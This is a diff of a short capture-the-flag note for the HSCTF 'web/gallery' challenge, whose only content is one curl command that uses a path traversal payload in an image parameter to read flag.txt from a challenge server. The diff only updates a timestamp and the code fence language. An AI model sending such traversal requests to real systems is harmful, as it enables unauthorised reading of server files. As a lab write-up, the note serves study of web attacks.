@@ -1,11 +1,11 @@
 ---
 created: 2024-06-11T01:36
-updated: 2024-06-11T01:38
+updated: 2024-08-04T20:28
 ---
 
 ## HSCTF - web/gallery
 
-```curl
+```bash
 curl "http://35.192.129.251:8003/image?image=wallpaper-1322673.jpg//./../../flag.txt"
 ```
 
